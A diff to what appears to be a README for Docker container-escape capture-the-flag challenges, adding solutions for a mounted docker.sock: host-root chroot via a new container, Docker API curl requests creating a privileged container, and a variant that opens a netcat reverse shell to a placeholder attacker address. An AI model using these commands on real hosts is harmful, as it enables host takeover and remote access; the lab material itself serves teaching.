@@ -19,7 +19,7 @@ docker run --rm -it --privileged ctf-privileged
   ```
   mkdir /mnt/host
   ```
-  3. Mount the host disk into the new folder
+  3. Mount the host disk into the new folder (because of `--privileged`)
   ```
   mount /dev/sda1 /mnt/host
   ```
@@ -27,5 +27,42 @@ docker run --rm -it --privileged ctf-privileged
   ```
   chroot /mnt/host /bin/bash
   ```
+</details>
 
+## chall02 - docker.sock
+
+```
+docker build -t ctf-socket .
+docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ctf-socket
+```
+
+<details>
+  <summary>Solution1</summary>
+
+  1. Access to `docker.sock` allows you to create new containers with full access to the host
+  ```
+  docker run -v /:/host -it --rm ubuntu chroot /host /bin/bash
+  ```
+</details>
+
+<details>
+  <summary>Solution2</summary>
+  
+  You can do the same using the Docker api, with `curl`
+  1. Create the container
+  ```
+  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["chroot", "/host"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container
+  ```
+  2. Launch the container
+  ```
+  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
+  ```
+  You can do the same to get a reverse shell
+  ```
+  # Create the container
+  curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "alpine", "Cmd": ["sh", "-c", "chroot /host nc <IP_ATTAQUANT> <PORT> -e /bin/sh"], "HostConfig": {"Binds": ["/:/host"], "Privileged": true, "PidMode": "host"}, "Tty": true, "OpenStdin": true}' http://localhost/v1.41/containers/create?name=escape_container
+
+  # Start the container
+  curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.41/containers/escape_container/start
+  ```
 </details>
